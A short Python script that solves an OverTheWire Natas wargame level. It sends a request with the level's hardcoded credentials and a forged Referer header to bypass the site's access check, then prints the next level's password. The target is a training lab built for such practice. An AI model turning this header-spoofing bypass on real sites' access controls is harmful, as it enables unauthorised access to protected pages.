import requests
import re
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style

colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}

url = f'http://{username}.natas.labs.overthewire.org/'

resp = requests.get(url=url, auth=(username, password), headers=headers)

soup = BeautifulSoup(resp.text, 'lxml')

print(re.findall('Access granted. (.*)', resp.text)[0])
